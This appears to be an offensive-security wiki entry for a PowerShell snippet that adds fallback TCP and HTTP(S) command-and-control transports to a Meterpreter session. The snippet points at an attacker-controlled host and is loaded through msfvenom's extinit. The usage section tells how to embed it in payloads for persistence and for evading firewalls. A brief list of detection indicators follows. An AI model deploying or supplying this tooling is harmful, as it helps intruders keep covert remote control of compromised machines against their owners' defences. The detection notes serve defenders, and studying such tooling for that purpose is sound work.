---
id: 19f0f0a2-58d6-403d-9f7a-19620d455e6d
name: AddTransports-Powershell-Script
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:21.692369+00:00'
updated_at: '2023-04-10T20:24:56.685165+00:00'
platforms:
  - Windows
tags:
  - metasploit
  - c2-transport
  - powershell
validated: true
---

# AddTransports-Powershell-Script

## Code

```powershell
Add-TcpTransport -lhost <host> -lport <port> -RetryWait 10 -RetryTotal 30
Add-WebTransport -Url http(s)://<host>:<port>/<luri> -RetryWait 10 -RetryTotal 30
```

## Description

This PowerShell script snippet adds both TCP and web (HTTP/HTTPS) transports to a Meterpreter session upon initialization. It configures fallback communication channels with retry logic to maintain persistence despite network disruptions or filtering. The script is designed to be loaded via extinit in msfvenom-generated payloads.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| <host> | Attacker's IP or hostname for transports | 192.168.1.100 |
| <port> | Port for TCP and web connections | 4444 |
| <luri> | Local URI path for web staging | /stager |
| -RetryWait 10 | Wait time in seconds between retries | 10 |
| -RetryTotal 30 | Maximum retry attempts | 30 |

## Usage

Save this as `AddTransports.ps1` and reference it in msfvenom's extinit parameter. Upon payload execution, it automatically configures multi-transport C2. Use in scenarios requiring evasion of single-protocol blocks, such as corporate firewalls. After session establishment, verify with `transport` in Meterpreter.

## Detection

- PowerShell execution logs showing Add-TcpTransport or Add-WebTransport invocations.
- Anomalous Meterpreter processes loading PowerShell extensions.
- Network traffic with repeated connection attempts to the same host on multiple ports/protocols.
- EDR alerts for unsigned PS1 scripts or extinit usage in payloads.

## Related

- [[procedures/Metasploit-Multiple-Transports-Payload-Generator]]
- [[tools/Metasploit-Framework]]
